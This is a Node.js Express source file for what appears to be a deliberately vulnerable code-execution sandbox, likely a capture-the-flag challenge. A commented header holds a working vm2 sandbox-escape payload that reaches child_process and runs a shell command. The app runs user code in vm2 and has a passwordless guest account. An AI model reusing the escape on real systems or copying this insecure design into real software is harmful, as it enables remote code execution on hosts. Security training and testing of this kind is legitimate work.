// exploit example
// ##########################################
// const err = new Error();
// err.name = {
//   toString: new Proxy(() => "", {
//     apply(target, thiz, args) {
//       const process = args.constructor.constructor("return process")();
//       throw process.mainModule.require("child_process").execSync("touch /tmp/pwned").toString();
//     },
//   }),
// };
// try {
//   err.stack;
// } catch (stdout) {
//   stdout;
// }

const express = require('express');
const session = require('express-session');
const bodyParser = require('body-parser');
const { NodeVM } = require('vm2');
const app = express();
const path = require('path');
const crypto = require('crypto');

function generateRandomSecret(length) {
  return crypto.randomBytes(length).toString('hex');
}

const sessionSecret = process.env.SESSION_SECRET || generateRandomSecret(32); // 32 bytes for the session secret
const adminPassword = process.env.ADMIN_PASSWORD || generateRandomSecret(16); // 16 bytes for passwords
const userPassword = process.env.USER_PASSWORD || generateRandomSecret(16);

app.set('view engine', 'ejs');

app.set('views', path.join(__dirname, 'templates'));

// Middleware to serve static files
app.use(express.static('static'));

// For parsing application/x-www-form-urlencoded
app.use(bodyParser.urlencoded({ extended: true }));

// Middleware to parse text/plain content
app.use(bodyParser.text({ type: 'text/plain' }));

app.use(session({
  secret: sessionSecret, // Change this to a random unique string
  resave: false,
  saveUninitialized: true,
  cookie: { secure: false } // For development, set to true in production (requires HTTPS)
}));

// Users database simulation
const users = {
  'admin': { password: adminPassword, role: 'admin' },
  'user': { password: userPassword, role: 'user' },
  'guest': { password: '', role: 'guest' }
};

// Middleware to check if the user is authenticated
function isAuthenticated(req, res, next) {
  if (req.session && req.session.user) return next();
  res.redirect('/login');
}

// Middleware to check if the user is an admin
function isAdmin(req, res, next) {
  if (req.session && req.session.user && req.session.role === 'admin') return next();
  res.status(403).send('Unauthorized');
}

app.get('/login', (req, res) => {
  res.render('login', { activePage: 'sandbox', username: req.session.user, error: req.query.error }); // This passes any error messages to the template
});

app.post('/login', (req, res) => {
  const { username, password } = req.body;
  const user = users[username];
  if (user && user.password === password) {
      req.session.user = username;
      req.session.role = user.role;
      res.redirect('/');
  } else {
      res.redirect('/login?error=invalid');
  }
});

app.get('/sandbox', isAuthenticated, (req, res) => {
  const user = users[req.session.user || 'guest'];
  if (req.session.role === 'admin') {
      res.render('sandbox', { activePage: 'sandbox', userRole: user.role, username: req.session.user || 'guest' }); // This will pass the username to the template
  } else {
      res.redirect('/');
  }
});

app.get('/logout', (req, res) => {
  req.session.destroy(err => {
      if (err) return res.send('Error');
      res.redirect('/login');
  });
});

// Default route serving index.html
app.get('/', (req, res) => {
  const user = users[req.session.user || 'guest'];
  res.render('index', { activePage: 'home', userRole: user.role, username: req.session.user || 'guest' }); // This will pass the username to the template
});

// Route for executing code
app.post('/run', isAuthenticated, (req, res) => {
    const userCode = req.body;
    let consoleOutput = []; // Array to store console outputs
    try {
        const vm = new NodeVM({
            console:'redirect',
            sandbox: {},
            // require: {
            //     external: true, // Note: be very cautious with this in real applications
            //     builtin: ['fs', 'path'], // Note: be very cautious with this in real applications
            // }
        });

        vm.on('console.log', (...data) => {
          consoleOutput.push(data.join(' '));
        });

        vm.run(userCode);

        // Send a structured JSON object
        res.json({output:consoleOutput});
    } catch (error) {
        res.status(500).send(`Error: ${error.message}`);
    }
});

// Start server
const PORT = 3000;
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
